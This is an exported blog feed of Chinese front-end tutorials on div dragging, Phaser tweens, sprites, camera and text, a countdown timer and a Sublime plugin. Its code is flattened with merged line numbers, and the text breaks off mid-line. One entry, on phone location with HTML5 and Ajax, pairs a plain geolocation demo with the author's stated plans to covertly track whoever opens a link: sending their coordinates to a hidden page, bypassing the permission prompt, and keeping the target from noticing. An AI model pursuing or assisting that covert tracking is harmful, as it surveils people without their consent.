easy。&emsp;&emsp;给一个判断条件，当div运动到距离上下左右边缘的距离小于某一个值时，这时就把left和top的值更改为边缘的值。这样div就贴到边缘上去。123456789101112131415161718var l1= oDiv1.offsetWidth - oDiv2.offsetWidth; //限制小div在大div中拖拽,计算能拖拽的max距离var t1 = oDiv1.offsetHeight - oDiv2.offsetHeight;if(l &gt; l1-50)&#123;l = l1;&#125;if(l &lt; 50)&#123;l = 0;&#125;if(t &gt; t1-50)&#123;t = t1;&#125;if(t &lt; 50)&#123;t = 0;&#125;（三）拖拽过程不被文字选中&emsp;&emsp;div在拖拽过程中，在div中的文本文字总是会被选中，为了解决这个问题，要使用一个叫做事件捕获的知识。1、先理解一下什么是事件捕获是跟事件冒泡相反的一种模型。事件捕获的是最后获得事件的是最小的子元素。事件冒泡最后获得事件的是父元素。&emsp;&emsp;之所以在拖拽过程中，div中的文字会被选中就是因为我没有处理好事件冒泡的问题。要解决这个问题，解铃还须系铃人，就把事件冒泡的问题处理好久ok。12345678910111213if(oDiv2.setCapture) //IE&#123;document.onmousemove = moveFn;document.onmouseup = upFn;oDiv2.setCapture(); //事件捕获后，所有事件都集中到这个divreturn false; //FF、Chrome、IE9&#125;else //FF、chrome&#123;document.onmousemove = moveFn; //！！！！根源所在，在优化版1中，设置为oDiv2.onmousemove时拖拽一次后无法再拖拽document.onmouseup = upFn;&#125;记得事件捕获后，当鼠标抬起时，也好释放oDiv2.releaseCapture();三、div拖拽的详细代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107&lt;!DOCTYPE html&gt;&lt;html lang="en"&gt;&lt;head&gt;&lt;meta charset="UTF-8"&gt;&lt;title&gt;限制范围内拖拽&lt;/title&gt;&lt;style&gt;*&#123;margin: 0;padding: 0;&#125;#div1&#123;width: 500px;height: 500px;background: #CCC;position: relative;&#125;#div2&#123;width: 100px;height: 100px;background: green;position: absolute;left: 0;top: 0;&#125;&lt;/style&gt;&lt;script&gt;window.onload = function()&#123;var oDiv1 = document.getElementById('div1');var oDiv2 = document.getElementById('div2');var disX,disY;/*--------------开始拖拽div2-----------------*/oDiv2.onmousedown = function(evt) //oDiv2.onmousedown表示按下这个对象，， document.onmouseup整个文档对象(这里把div改成document是防止弄丢div)&#123;var oEvent = evt || window.event; //evt兼容FF/ChromedisX = oEvent.clientX - oDiv2.offsetLeft; //-oDiv2.offsetLeft的距离是为了减去div与视口边框的距离disY = oEvent.clientY - oDiv2.offsetTop;if(oDiv2.setCapture) //IE&#123;document.onmousemove = moveFn;document.onmouseup = upFn;oDiv2.setCapture(); //事件捕获后，所有事件都集中到这个divreturn false; //FF、Chrome、IE9&#125;else //FF、chrome&#123;document.onmousemove = moveFn; //！！！！根源所在，在优化版1中，设置为oDiv2.onmousemove时拖拽一次后无法再拖拽document.onmouseup = upFn;&#125;function moveFn(evt) //把document重新改为div，利用setCapture事件捕获，把事件都集中在一个物体上&#123;var oEvent = evt || window.event;var l = oEvent.clientX - disX; //计算鼠标移过的距离var t = oEvent.clientY - disY;var l1= oDiv1.offsetWidth - oDiv2.offsetWidth; //限制小div在大div中拖拽,计算能拖拽的max距离var t1 = oDiv1.offsetHeight - oDiv2.offsetHeight;if(l &gt; l1-50)&#123;l = l1;&#125;if(l &lt; 50)&#123;l = 0;&#125;if(t &gt; t1-50)&#123;t = t1;&#125;if(t &lt; 50)&#123;t = 0;&#125;oDiv2.style.left = l +'px';oDiv2.style.top = t +'px';&#125;function upFn()&#123;this.onmousedown = null;this.onmousemove = null;if(oDiv2.releaseCapture) //如果事件捕获存在，则释放事件捕获&#123;oDiv2.releaseCapture();&#125;&#125;return false; //阻止浏览器默认事件&#125;;&#125;;&lt;/script&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="div1"&gt;使用了事件捕获后，现在拖拽div中的问题可不应该被选中了哦&lt;/div&gt;&lt;div id="div2"&gt;helloworld helloworld&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>JS/Jq</category>
      </categories>
      <tags>
        <tag>js事件捕获</tag>
        <tag>js限制范围内吸附</tag>
        <tag>js限制范围内拖拽</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入详解Phaser补间动画]]></title>
    <url>%2F2015%2F09%2F22%2F%E6%B7%B1%E5%85%A5%E8%AF%A6%E8%A7%A3phaser%E8%A1%A5%E9%97%B4%E5%8A%A8%E7%94%BB%2F</url>
    <content type="text"><![CDATA[Tweens是什么?&emsp;&emsp;Tweens通常被称为补间动画。补间动画是指在确定好两个关键帧之后，由计算机自动生成这两帧之间插补帧，从而实现动画的过程。例如，物体从当前位置在两秒内向右移动200个像素，只要设置好目标位置（当前位置的右边200像素）和时长（两秒），则计算机会自动生成补间动画，在两秒内使物体从当前位置移到目标位置。创建一个Tween补间的目标对象最常见的创建一个补间动画的语句如下所示：12var tween =this.game.add.tween(this.sprite).to(&#123; x: 400 &#125;, 5000,Phaser.Easing.Linear.None, false, 0, -1, true);tween.start();第一句：调用Phaser.Game中的补间管理类创建一个补间动画tween。this.sprite表示针对这个精灵创建动画，这里也可以是一个组。to()函数是最关键的函数，记录着精灵的属性变化、时长及其他相关属性，关于这个函数，我们将在下文最详细的介绍。第二句：启动动画。Tween.toto(properties, duration, ease, autoStart, delay, repeat, yoyo)设置目标值。补间将从当前属性值变为to函数设置的值（参数properties）其参数如下：properties 包含补间属性的对象，例如Sprite.x ， Sound.volume。这个参数表示目标关键帧中精灵的属性；duration=1000 补间持续时长，单位毫秒；ease=null 缓动函数。 可以用数学公式控制动画，这样就可以实现加速以及减速效果，或者向动画添加特殊效果，比如弹跳效果；将在下文重点介绍。autoStart=false 补间是否自动开始；delay=0 启动延时，单位毫秒；repeat=0 重复次数。-1表示不停地重复。只对本补间有效，对串联的补间无效；yoyo=false 是否自动反过来回放。如果设置为true，则不会触发onComplete，所以应监听onLoop；在下面这几句示例代码中，分别设置了平移、旋转、透明度变化的补间动画：12345678// 平移this.add.tween(boss).to(&#123;x:20, y: 20&#125;, 2000, Phaser.Easing.Linear.None)// 旋转seaLifeTween.to(&#123;angle: -gameTitleSeaLife.angle&#125;,5000,Phaser.Easing.Linear.None,true,0,1000,true);// 透明度fadeTween.to(&#123; alpha:0&#125;,2000,Phaser.Easing.Cubic.Out,true);Tween.fromfrom(properties,duration, ease, autoStart, delay, repeat, yoyo)设置起始值。补间将从from函数设置的属性值变为当前值参数及其含义与to函数相同、Tween常用方法重复repeat(total, index=0)设置tween重复次数。total：重复次数，0表示不重复，-1表示一直重复。index：子tween编号。本函数可以对某个子tween单独设置重复次数，-1表示对所有的子tween进行设置repeatAll(total)设置当前tween和所有子tween的重复次数。tween A和三个子tween B,C,C，重复次数为2，则运行结果为：ABCDABCD，然后再调用onLoop。total：重复次数，0表示不重复，-1表示一直重复。loop(value=true)设置tween及其子tween是否循环。如果没有子tween，则此函数无效；如果传入true，则相当于Tween.repeatAll(-1)，如果传入false，则相当于Tween.repeatAll(0)。&emsp;&emsp;下面这段代码使精灵先右移400像素，再下移250像素，再左移400像素，再上移250像素，然后不断重复上面四步。实际上这个精灵就是不断的在画一个矩形。12345this.game.add.tween(this.sprite).to(&#123; x: 400 &#125;, 2000).to(&#123; y: 250 &#125;, 2000).to(&#123; x: 0 &#125;, 2000).to(&#123; y: 0 &#125;, 2000).loop().start();启停pause();暂停补间resume();继续补间start(index=0)启动补间，并调用onStart。index：指定某个子tween启动stop(complete=false)结束补间。如果补间正在运行，则设置一个结束标志。complete表示这个补间是否已经结束。只有当complete设置为true的时候，才会调用onComplete，并启动串联的tween。反向yoyo(enable, index= 0)如果enable设置为true，则补间先从from到to，然后再从to到from。如果设置为false，则可以禁用已经激活的yoyo。index：子tween编号，-1表示所有子tween缓动函数&emsp;&emsp;缓动函数是用来指定动画效果在执行时的速度，使其看起来更加真实。现实物体照着一定节奏移动，并不是一开始就移动很快的。例如，当我们打开抽屉时，首先会让它加速，然后慢下来。当某个东西往下掉时，首先是越掉越快，撞到地上后回弹，最终才又碰触地板。在Phaser中内置了十一种缓动函数：12345678910111213Phaser.Easing() &#123;Phaser.Easing.Linear 线性Phaser.Easing.Quadratic 二次次Phaser.Easing.Cubic 三次方。创建使用公式image 加速和/或减速的动画。 与圆缓冲类似，但是是基于立方体函数的时间来产生一个一开始加速度较慢然后越来越快的动画。Phaser.Easing.Quartic 四次方Phaser.Easing.Quintic 五次方Phaser.Easing.Sinusoidal 正弦Phaser.Easing.Exponential 指数Phaser.Easing.Circular 圆形。创建使用循环函数加速和/或减速的动画。 基于三角函数（圆函数）来加速动画，一开始的加速度比较慢，越往后加速度越快。Phaser.Easing.Elastic 弹性Phaser.Easing.Back 倒退。让动画在继续之前往后退一点。这有点象在斜坡上启动汽车，会往后倒退一点然后才前进。Phaser.Easing.Bounce 反弹。有弹回效果的动画，类似篮球落下，弹起，再落下，即弹跳反冲。&#125;其中，Phaser.Easing.Linear是最基本的匀速运动。另外十种动画示例如下（摘自http://easings.net/zh-cn）：Tween 事件onStartTween开始的时候调用。如果在tween开始之前有一个延时，则要等延时结束后才调用onStartonRepeat当Tween和他的所有子Tween重复的时候调用。如果Tween没有子Tween，则不会调用onLoopTween或者子Tween循环的时候调用onComplete&emsp;&emsp;当Tween和他的所有子Tween都结束时候调用。如果Tween设置为循环或者repeatAll(-1)，则不会调用。这个函数是最常用的，例如，当补间动画ballTween结束的时候，触发adjustBalances()函数，在adjustBalances()函数中又创建了另一个补间动画balanceTween，在其结束时触发函数allowBallFalling()：1234567891011ballTween.onComplete.add(adjustBalances,this);function adjustBalances()&#123;var balanceTween = game.add.tween(……);……balanceTween.onComplete.add(allowBallFalling)&#125;function allowBallFalling()&#123;……&#125;onChildComplete当Tween或者他的任意一个子Tween结束时调用。每一个子Tween结束的时候都会调用，除非无限循环下去Phaser内部如何管理Tweens补间管理器在Game类中维护了一个补间管理器tweens：1234// core/game.jsPhaser.Game () &#123;this.tweens = new Phaser.TweenManager(this);&#125;补间管理里主要用来管理补间动画，常用的有增加、删除、暂停、继续某个补间动画：1234567// tween/TweenManager.jsPhaser.TweenManager() &#123;add(tween);remove(tween);pauseAll();resumeAll();&#125;补间接口123456789101112131415161718192021// tween/Tween.js// 生成to(properties, duration, ease, autoStart,delay, repeat, yoyo)from(properties, duration, ease, autoStart,delay, repeat, yoyo)// 控制loop(value=true)repeat(total, index=0)repeatAll(total)pause();resume();start(index=0)stop(complete=false)yoyo(enable, index= 0)// 响应this.onStart(target, this);this.onLoop(target, this);this.onRepeat(target, this);this.onChildComplete(target, this);this.onComplete(target, this);on开头的响应函数返回的都是Phaser.Signal()，Signal具有如下方法：12345// Core/Signal.jsadd()addOnce() 一次性的，即调用之后就会被删掉remove()removeAll()&nbsp;]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>Phaser tween</tag>
        <tag>Phaser补间动画</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[基于HTML5+Ajax实现的手机定位]]></title>
    <url>%2F2015%2F09%2F22%2F%E5%9F%BA%E4%BA%8Ehtml5ajax%E5%AE%9E%E7%8E%B0%E7%9A%84%E6%89%8B%E6%9C%BA%E5%AE%9A%E4%BD%8D%2F</url>
    <content type="text"><![CDATA[目前的版本只是demo，仍有几个问题需要完善一下，问题如下：1，如何将经纬度等数据发送到被定位人看不到的页面上。2，如何绕过或或强制让打开链接的人允许使用定位（弹窗）。3，目前或取经纬度后，要自行用谷歌地球去分析用户位置（通过卫星地图定位并显示），如何简化这一部分，让被定位者的经纬度自动生成地图图片并一起导入到其他页面（总之不能让被定位者察觉自己被定位的这一事实）。123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt;&lt;meta charset="utf-8"&gt;&lt;meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"&gt;&lt;title&gt;demo..&lt;/title&gt;&lt;script type="text/javascript" src="http://www.npm8.com/jquery.js"&gt;&lt;/script&gt;&lt;style type="text/css"&gt;.demo&#123;width:560px; margin:60px auto 10px auto&#125;.geo&#123;margin-top:20px&#125;.demo p&#123;line-height:32px; font-size:16px&#125;.demo p span,#baidu_geo,#google_geo&#123;font-weight:bold&#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;div id="main"&gt;&lt;div class="demo"&gt;&lt;p&gt;地理坐标：&lt;span id="latlon"&gt;&lt;/span&gt;&lt;/p&gt;&lt;div class="geo"&gt;&lt;p&gt;百度地图定位位置：&lt;/p&gt;&lt;p id="baidu_geo"&gt;&lt;/p&gt;&lt;/div&gt;&lt;div class="geo"&gt;&lt;p&gt;GOOGLE地图定位位置：&lt;/p&gt;&lt;p id="google_geo"&gt;&lt;/p&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;&lt;script&gt;function getLocation() &#123; if (navigator.geolocation) &#123; navigator.geolocation.getCurrentPosition(showPosition, showError); &#125; else &#123; alert("浏览器不支持地理定位。"); &#125;&#125;function showPosition(position) &#123; $("#latlon").html("&lt;br /&gt;纬度:" + position.coords.latitude + '&lt;br /&gt;经度:' + position.coords.longitude); var latlon = position.coords.latitude + ',' + position.coords.longitude; //baidu var url = "http://api.map.baidu.com/geocoder/v2/?ak=C93b5178d7a8ebdb830b9b557abce78b&amp;amp;callback=renderReverse&amp;amp;location=" + latlon + "&amp;amp;output=json&amp;amp;pois=0"; $.ajax(&#123; type: "GET", dataType: "jsonp", url: url, beforeSend: function() &#123; $("#baidu_geo").html('正在定位...'); &#125;, success: function(json) &#123; if (json.status == 0) &#123; $("#baidu_geo").html(json.result.formatted_address); &#125; &#125;, error: function(XMLHttpRequest, textStatus, errorThrown) &#123; $("#baidu_geo").html(latlon + "地址位置获取失败"); &#125; &#125;); //google var url = 'http://maps.google.cn/maps/api/geocode/json?latlng=' + latlon + '&amp;amp;language=CN'; $.ajax(&#123; type: "GET", url: url, beforeSend: function() &#123; $("#google_geo").html('正在定位...'); &#125;, success: function(json) &#123; if (json.status == 'OK') &#123; var results = json.results; $.each(results, function(index, array) &#123; if (index == 0) &#123; $("#google_geo").html(array['formatted_address']); &#125; &#125;); &#125; &#125;, error: function(XMLHttpRequest, textStatus, errorThrown) &#123; $("#google_geo").html(latlon + "地址位置获取失败"); &#125; &#125;);&#125;function showError(error) &#123; switch (error.code) &#123; case error.PERMISSION_DENIED: alert("定位失败,用户拒绝请求地理定位"); break; case error.POSITION_UNAVAILABLE: alert("定位失败,位置信息是不可用"); break; case error.TIMEOUT: alert("定位失败,请求获取用户位置超时"); break; case error.UNKNOWN_ERROR: alert("定位失败,定位系统失效"); break; &#125;&#125;getLocation();&lt;/script&gt;&lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>前端杂货</category>
      </categories>
      <tags>
        <tag>h5+ajax手机定位</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[根据开始时间(服务器时间、客户端时间)和结束时间 倒计时]]></title>
    <url>%2F2015%2F09%2F22%2F%E6%A0%B9%E6%8D%AE%E5%BC%80%E5%A7%8B%E6%97%B6%E9%97%B4%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%97%B6%E9%97%B4%E3%80%81%E5%AE%A2%E6%88%B7%E7%AB%AF%E6%97%B6%E9%97%B4%E5%92%8C%E7%BB%93%E6%9D%9F%E6%97%B6%E9%97%B4%2F</url>
    <content type="text"><![CDATA[效果图：HTML代码：1234567&lt;h1&gt;根据结束时间和服务器时间 倒计时&lt;/h1&gt;&lt;div class="time-item"&gt;&lt;span id="day_show"&gt;0天&lt;/span&gt;&lt;strong id="hour_show"&gt;0时&lt;/strong&gt;&lt;strong id="minute_show"&gt;0分&lt;/strong&gt;&lt;strong id="second_show"&gt;0秒&lt;/strong&gt;&lt;/div&gt;&nbsp;CSS代码：12345678910111213141516171819202122232425262728293031323334h1 &#123;font-family:"微软雅黑";font-size:40px;margin:20px 0;border-bottom:solid 1px #ccc;padding-bottom:20px;letter-spacing:2px;&#125;.time-item strong &#123;background:#C71C60;color:#fff;line-height:49px;font-size:36px;font-family:Arial;padding:0 10px;margin-right:10px;border-radius:5px;box-shadow:1px 1px 3px rgba(0,0,0,0.2);&#125;#day_show &#123;float:left;line-height:49px;color:#c71c60;font-size:32px;margin:0 10px;font-family:Arial,Helvetica,sans-serif;&#125;.item-title .unit &#123;background:none;line-height:49px;font-size:24px;padding:0 10px;float:left;&#125;JS代码：123456789101112131415161718192021222324252627282930var startTime = '2015-09-22 15:10:12'; //开始时间 或者服务器时间 也可以是客户端时间startTime = new Date(startTime.replace(/-/, " "));var endTime = '2015-09-25 09:40:45'; //结束时间endTime = new Date(endTime.replace(/-/, " "));var intDiff = parseInt((endTime.getTime() - startTime.getTime()) / 1000); //倒计时总秒数量function timer(intDiff) &#123; window.setInterval(function() &#123; var day = 0, hour = 0, minute = 0, second = 0; //时间默认值 if (intDiff &gt; 0) &#123; day = Math.floor(intDiff / (60 * 60 * 24)); hour = Math.floor(intDiff / (60 * 60)) - (day * 24); minute = Math.floor(intDiff / 60) - (day * 24 * 60) - (hour * 60); second = Math.floor(intDiff) - (day * 24 * 60 * 60) - (hour * 60 * 60) - (minute * 60); &#125; if (minute &lt;= 9) minute = '0' + minute; if (second &lt;= 9) second = '0' + second; $('#day_show').html(day + "天"); $('#hour_show').html('&lt;s id="h"&gt;&lt;/s&gt;' + hour + '时'); $('#minute_show').html('&lt;s&gt;&lt;/s&gt;' + minute + '分'); $('#second_show').html('&lt;s&gt;&lt;/s&gt;' + second + '秒'); intDiff--; &#125;, 1000);&#125;$(function() &#123; timer(intDiff);&#125;);查看演示点击下载]]></content>
      <categories>
        <category>插件库</category>
      </categories>
      <tags>
        <tag>根据客户端时间和结束时间 倒计时</tag>
        <tag>根据开始时间和结束时间 倒计时</tag>
        <tag>根据服务器时间和结束时间 倒计时</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Sublime插件—Phaser Completions]]></title>
    <url>%2F2015%2F09%2F22%2Fsublime%E6%8F%92%E4%BB%B6-phaser-completions%2F</url>
    <content type="text"><![CDATA[由于在sublime上面没有看到很好的phaser补全代码的插件，于是决定自己动手写一个。加入了很多的补全提示，但是发现太多的提示反而会是种干扰，而且提示出来的词优先级也是有问题。不知道sublime上有没有地方可以设置还有就是使用了英文.之后，前面的内容就不包含在提示搜索里面了，这是不是也有地方可以设置，高手请不吝赐教下一步决定自己试用一下，然后可能再出一个精简版的补全文件。项目地址：https://github.com/longjian/Phaser-completions.git使用方法很简单，把文件拷贝到sublime的package/user文件夹下就行，找不到的话就菜单栏tools–&gt;new snippet然后保存文件，文件保存的路径即是目标文件夹。]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>Phaser Completions</tag>
        <tag>Sublime插件phaser</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser里通过json读取数据的两种方式]]></title>
    <url>%2F2015%2F09%2F22%2Fphaser%E9%87%8C%E9%80%9A%E8%BF%87json%E8%AF%BB%E5%8F%96%E6%95%B0%E6%8D%AE%E7%9A%84%E4%B8%A4%E7%A7%8D%E6%96%B9%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[1. Phaser官方教程里的方式首先在preload里面加载游戏数据文本this.load.text(‘data’, ‘assets/data.json’);​然后通过cache和json解析函数获得数据，其中JSON.parse解析是js自带函数this.levelData = JSON.parse(this.game.cache.getText(‘data’));​2. 其他开发者的使用案例​首先在preload里面加载游戏数据文本this.load.json(‘data’, ‘assets/data.json’);​然后通过cache和getJSON获得数据var str = game.cache.getJSON(‘data’);看起来第二种方式更便捷一些，可能是因为phaser更新版本后官网的教程没有及时跟上的原因吧。&nbsp;]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser json</tag>
        <tag>phaser通过json读取数据</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser官方示例教程整理—Sprite（精灵）]]></title>
    <url>%2F2015%2F09%2F21%2Fphaser%E5%AE%98%E6%96%B9%E7%A4%BA%E4%BE%8B%E6%95%99%E7%A8%8B%E6%95%B4%E7%90%86-sprite%EF%BC%88%E7%B2%BE%E7%81%B5%EF%BC%89%2F</url>
    <content type="text"><![CDATA[官方教程示例 http://phaser.io/examples精灵 Sprite1. 创建一个精灵12game.load.image('mushroom', 'assets/sprites/mushroom2.png');var test = game.add.sprite(200, 200, 'mushroom');game.add.bitmapText(200, 100, '字体名称', '文本内容', 64);&nbsp;2. 创建一个图像精灵和图像的区别在于，图像不能添加物理属性和帧动画1var image = game.add.image(100, 100, 'pic');&nbsp;3. 精灵对齐方式1Sprite.anchor.x = 0;x方向上，0/0.5/1分别对应中心点在图像左、中、右y方向上，​0/0.5/1分别对应中心点在图像上、中、下&nbsp;4. 精灵动画动画每一帧大小为37x45，一共有18帧图片在一张PNG文件上；如果png上充满了动画帧，则不需要标明帧图片的数量，如果有多余的空白，则需要填入数值动画帧应该是从上至下，从左至右进行播放1234game.load.spritesheet('mummy', 'assets/sprites/metalslug_mummy37x45.png', 37, 45, 18);var mummy = game.add.sprite(10, 10, 'mummy');mummy.animations.add('walk');mummy.animations.play('walk', 20, true);&nbsp;5. 子精灵12parent = game.add.sprite(100, 100, 'mushroom');parent.addChild(game.make.sprite(-50, -50, 'mummy'));&nbsp;6. 精灵碰撞12345678910111213//设置物理引擎对象组pineapples = game.add.group();pineapples.enableBody = true;pineapples.physicsBodyType = Phaser.Physics.ARCADE;for (var i = 0; i &lt; 10; i++)&#123; var pineapple = pineapples.create(200 + i * 48,50, 'pineapple'); //设置和世界边界的碰撞、xy方向上的重力值、弹性 pineapple.body.collideWorldBounds = true; pineapple.body.gravity.x = game.rnd.integerInRange(-50, 50); pineapple.body.gravity.y = 100 + Math.random() * 100; pineapple.body.bounce.setTo(0.9, 0.9);&#125;&nbsp;7. 销毁精灵12345sprite.inputEnabled = true;//鼠标悬停时显示手型形状sprite.input.useHandCursor = true;sprite.events.onInputDown.add(destroySprite, this);destroySprite：sprite.destroy();&nbsp;8. 动态遮罩123456789101112131415161718//设置背景图片pic = game.add.sprite(0, 0, 'trsi');w = pic.width;h = pic.height;//设置窗口大小cropRect = new Phaser.Rectangle(0, 0, 128, 128);//使用遮罩pic.crop(cropRect);function update() &#123; if (game.input.x &lt; w &amp;amp;&amp;amp; game.input.y &lt; h) &#123; pic.x = game.input.x; pic.y = game.input.y; cropRect.x = game.input.x; cropRect.y = game.input.y; pic.updateCrop(); &#125;&#125;&nbsp;9. 子精灵固定大小1234567parent = game.add.sprite(100, 100, 'disk');child = game.make.sprite(0, 0, 'ball');parent.addChild(child);// Fix the scale of the child so it will never scale below 1 or above 2child.setScaleMinMax(1, 2);// Even though the parent will scale, the child will remain at its own scale (and this is carried on down to any of its children)game.add.tween(parent.scale).to( &#123; x: 3, y: 3 &#125;, 2000, Phaser.Easing.Linear.None, true, 0, 1000, true);&nbsp;10. 圆形遮罩123456789101112//Here we add a Sprite to the display listsprite = game.add.sprite(0, 0, 'chaos');sprite.scale.set(2);//创建遮罩形状mask = game.add.graphics(0, 0);//填充mask.beginFill(0xffffff);mask.drawCircle(100, 100, 100);sprite.mask = mask;//移动鼠标或遮罩时game.input.addMoveCallback(move, this);move:mask.x = x - 100;mask.y = y - 100;&nbsp;11. 移动精灵加载不规则的精灵图集方法，需要json文件说明123game.load.atlasJSONHash('bot','assets/sprites/running_bot.png','assets/sprites/running_bot.json');制作工具app: “http://www.texturepacker.com“,&nbsp;12. 不使用引擎的碰撞检测123456789101112sprite1 = game.add.sprite(100, 200, 'atari1');sprite1.inputEnabled = true;sprite1.input.enableDrag();sprite2 = game.add.sprite(400, 400, 'atari2');sprite2.inputEnabled = true;sprite2.input.enableDrag();//检测函数function checkOverlap(spriteA, spriteB) &#123; var boundsA = spriteA.getBounds(); var boundsB = spriteB.getBounds(); return Phaser.Rectangle.intersects(boundsA, boundsB);&#125;&nbsp;13. 精灵旋转和缩放123sprite = game.add.sprite(400, 100, 'disk');game.add.tween(sprite).to( &#123; angle: 45 &#125;, 2000, Phaser.Easing.Linear.None, true);game.add.tween(sprite.scale).to( &#123; x: 2, y: 2 &#125;, 2000, Phaser.Easing.Linear.None, true);&nbsp;14. 精灵定点旋转1orb.position.rotate(ship.x, ship.y, 2, true, 100);&nbsp;15. 加载bitmap精灵12345678// 创建bitmapvar bmd = game.add.bitmapData(128,128);// draw to the canvas context like normalbmd.ctx.beginPath();bmd.ctx.rect(0,0,128,128);bmd.ctx.fillStyle = '#ff0000';bmd.ctx.fill();var sprite = game.add.sprite(200, 200, bmd);&nbsp;16. 加载图集1234game.load.atlas('atlas', 'assets/pics/texturepacker_test.png', 'assets/pics/texturepacker_test.json');chick = game.add.sprite(64, 64, 'atlas');chick.frameName = 'budbrain_chick.png';chick.frame = 0;可以通过名称或顺序来获得切图&nbsp;]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser中的sprite（精灵）</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser官方示例教程整理—Camera（相机）]]></title>
    <url>%2F2015%2F09%2F21%2Fphaser%E5%AE%98%E6%96%B9%E7%A4%BA%E4%BE%8B%E6%95%99%E7%A8%8B%E6%95%B4%E7%90%86-camera%EF%BC%88%E7%9B%B8%E6%9C%BA%EF%BC%89%2F</url>
    <content type="text"><![CDATA[官方教程示例 http://phaser.io/examples相机 Camera1. 镜头跟随实现游戏角色在大地图中的镜头跟随效果，角色保持在镜头中间，靠近边界时镜头也不会超出地图边界。12345game.physics.startSystem(Phaser.Physics.P2JS);player = game.add.sprite(game.world.centerX, game.world.centerY, 'player');game.physics.p2.enable(player);cursors = game.input.keyboard.createCursorKeys();game.camera.follow(player); //镜头跟随关键&nbsp;2. 镜头移动可以直接通过game.camera来控制镜头的位置1game.camera.x = 50;&nbsp;​3. 镜头跟随触发区域dead zone在镜头跟随的基础上，可以设定一个方形的触发镜头移动的区域Dead Zone。即当角色到达Dead Zone的边界时，镜头就触发往相应方向移动的效果。如果不设置的话，角色必须到达镜头边界后，才会移动镜头（也就是默认的Dead Zone大小与镜头区域大小一致）。1game.camera.deadzone = new Phaser.Rectangle(100, 100, 600, 400);&nbsp;4. 保持在镜头固定位置如果想在镜头某处固定一个元素，比如电视台的图标那样，只需要将元素的fixedToCamera设置成true1logo.fixedToCamera = true;&nbsp;5. 镜头跟随模式共有四种跟随模式：LOCKON/PLATFORMER/TOPDOWN/TOPDOWN_TIGHT实际上就是设置了四种不同大小的Dead Zone:1234567w = width/8 h = height/3​ LOCKON：Dead Zone 设置为nullPLATFORMER​：（-7w/16, -1h/3, w,h）helper = max(w, h)/4​TOPDOWN：（(width-helper)/2, (height-helper)/2, helper, helper）helper = max(w, h)/8​​TOPDOWN_TIGHT​：（(width-helper)/2, (height-helper)/2, helper, helper）&nbsp;6. 角色不出镜头范围需要给游戏角色的图片加上物理碰撞检测，碰到边界时，角色将无法在继续向前]]></content>
      <categories>
        <category>Phaser</category>
      </categories>
      <tags>
        <tag>phaser中的Camera(相机)</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Phaser官方示例教程整理—Text(文本)]]></title>
    <url>%2F2015%2F09%2F21%2Fphaser-%E5%AE%98%E6%96%B9%E7%A4%BA%E4%BE%8B%E6%95%99%E7%A8%8B%E6%95%B4%E7%90%86-text%E6%96%87%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[官方教程示例 http://phaser.io/examples文本 Text1. 加载位图字体12game.load.bitmapFont('名称', '位图png', '位图xml');game.add.bitmapText(200, 100, '字体名称', '文本内容', 64);2. 位图文本拖拽12bmpText = game.add.bitmapText(200, 100, '字体名称', '文本内容', 64);bmpText​.inputEnabled = true;3. 文本对齐= 0;```123456x方向上，0/0.5/1分别对应靠右、中间、靠左对齐​y方向上，​0/0.5/1分别对应靠上、中间、靠下对齐### 4\. 位图文本最大显示宽度```javascriptbmpText​.maxWidth = 400;5. 位图文本清除1var purged = bmpText.purgeGlyphs();6. 位图文本使用物理系统12345678910game.physics.arcade.enable( [text1, text2] );//意思就是位图可以和普通图片一样使用物理系统引擎吧game.physics.startSystem(Phaser.Physics.ARCADE);//开始使用引擎game.physics.arcade.enable([ text1, text2 ]);//在文本上添加引擎//设置速度、碰撞边界、弹性text1.body.velocity.setTo(200, 200);text1.body.collideWorldBounds = true;text1.body.bounce.set(1);game.physics.arcade.collide(text1, text2, onCollide);//碰撞检测7. 文本居中（阴影和背景）style里面设置align:”center”​即可text.setShadow(x,y,color,blur);text.setTextBounds(x,y,w,h);8. 文本居中（图片上居中）实际上是通过图片的位置，实时调整字体的坐标9. 文本字母颜色设置可以从字符串某个位置开始，设置后面字符的颜色text.addColor(‘颜色值’, 起始位置);10. 文本动态阴影实现了字体的阴影动态变化，效果比较酷炫11. 字体扩展功能可以自定义特殊的字体类，直接在游戏中创建12. 在线字体直接使用在线的字体库13. 文本逐字逐句出现展现输入文字过程的效果​14. 文本颜色控制通过字体style中，以函数来返回相应的值，达到控制字体的效果fill:generateHexColor()​15. 文本制作工具kvazars.com/littera15. 文本删除text.destroy();16. 字体复古风格效果17. ​修改文本样式text.fontSize = 30;18. ​文本区设置和对齐1234text.setTextBounds(x, y, w, h);text.align = align[i].a;text.boundsAlignH = align[i].h;text.boundsAlignV = align[i].v;19. ​文本事件响应123456text.inputEnabled = true;text.input.enableDrag();text.events.onInputOver.add(over, this);text.events.onInputOut.add(out, this);text.events.onInputDown.add(down, this);text.events.onInputUp.add(up, this);20. ​文本渐变样式12345var grd = text.context.createLinearGradient(0, 0, 0, 